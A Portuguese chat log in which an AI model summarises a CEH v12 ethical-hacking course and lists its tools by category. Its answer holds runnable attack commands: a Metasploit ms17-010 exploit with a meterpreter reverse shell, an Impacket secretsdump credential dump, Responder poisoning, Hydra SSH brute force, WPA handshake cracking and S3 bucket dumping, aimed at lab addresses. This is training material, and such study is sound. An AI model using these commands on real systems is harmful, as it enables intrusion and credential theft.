Resumo CEH v12 Treimanemto 


IA Faça Resumo com o uso das ferramentas e as separe por categoria

Seu documento descreve um curso de treinamento (CEHV12) para hacking ético, incluindo:

Passos para fazer o download e armazenar o certificado após a conclusão.

Vários comandos e ferramentas usadas em pentest (por exemplo, Python, ferramentas de OSINT, configuração de conexão, métodos de varredura).

Técnicas para enumeração, exploração e escalada de privilégios em diferentes plataformas (por exemplo, Windows, Linux).

Seções sobre diferentes módulos, como Segurança de Aplicações Web, Injeção de SQL, Wireless, Mobile e Cloud.

Instruções para usar ferramentas como Metasploit, Nmap, Hydra, Aircrack-ng e outras.

O documento fornece instruções detalhadas de linha de comando e links para recursos.


quero separadamente uso das ferramentes de acordo com o texto
Claro! Aqui está a lista separada das ferramentas e seus usos, conforme mencionado no texto:

Ferramentas OSINT:
searx.space: Ferramenta de busca para informações de código aberto.

Preparação para Pentest:
Python:

Compilação para 32bits: apt-get install gcc-multilib g++-multilib

Invocar bash via Python: python -c 'import pty;pty.spawn("/bin/bash");'

Servidor web em Python: python3 -m http.server 80



Configuração de Teclado e Cheatsheets:
Configuração de teclado: setxkbmap -model abnt2 -layout br

Cheatsheet via linha de comando:

Alias: alias cht='f(){ curl -skL http://cheat.sh/"$@"; unset -f f; }; f'

Exemplos: cht nmap, cht steghide, cht find, cht tcpdump

Ferramentas de Clonagem e Uso:
ctfr:

Clonagem: git clone https://github.com/UnaPibaGeek/ctfr.git

Instalação: pip3 install -r requirements.txt

Uso: python3 ctfr.py -d pimpao.com.br

dnsdumpster e crt.sh: Ferramentas para levantamento de subdomínios.

## Ferramentas de Enumeração:
theHarvester:

Busca no LinkedIn: theHarvester -d eccouncil -l 200 -b linkedin

Netcraft:

Levantamento de sistema operacional: sitereport.netcraft.com

Shodan:

Mapeamento de dispositivos: shodan.io

CEWL:

Gerar dicionários: cewl -d 2 -m 5 www.certifiedhacker.com -u "Firefox 5.1" -w /tmp/dicionario.txt

## Ferramentas Recon-ng:
Recon-ng:

Criação de workspaces e módulos:

bash
recon-ng
workspaces create CEH
modules load recon/domains-hosts/brute_hosts
Scanning e Enumeração de Rede:
hping3:

Scanning e XMAS: hping3 -S -p 80 192.168.10.101

Nmap:

SNMP: nmap -sU -p 161 192.168.10.103 --script=snmp-win32-users.nse

Exploração e Privilege Escalation:
Metasploit:

## Uso do exploit ms17-010: Ilab cai 

bash
search ms17-010
use 2
set rhosts 10.10.10.7
set payload windows/x64/meterpreter/reverse_tcp
exploit
Impacket:

Uso do secretsdump: impacket-secretsdump.py -just-dc CEH/SERVER2016$@10.10.10.16

Ferramentas de Invasão de Sistema:
Responder:

## Captura por envenenamento: responder -I eth0 Ilab

## Hydra: Ilab

Quebra de senha: hydra -v -V -l eder -P dicionario.txt -t 4 ssh://192.168.10.113

Ferramentas de Wireless:
Aircrack-ng:

Quebra de senha de handshake: aircrack-ng -w dicionario.txt pacotescapturados.pcap

Crunch:

Gerar dicionário em memória: crunch 8 8 0123456789 | aircrack-ng -t -h -b macaddressaccesspoint pacotescapturados.cap -w -

Ferramentas de Mobile:
Phonesploit:

Conectar via ADB e capturar screenshots.

Ferramentas de Cloud:
AWS CLI:

Instalação e configuração:

bash
pip3 install awscli
aws configure
S3Scanner:

Procurar e fazer dump de buckets:

bash
cd /opt/S3Scanner
python3 s3scanner.py sites.txt -d
Essas são as ferramentas listadas e o uso conforme o conteúdo do seu documento. Precisa de mais alguma coisa?

Sem resumo




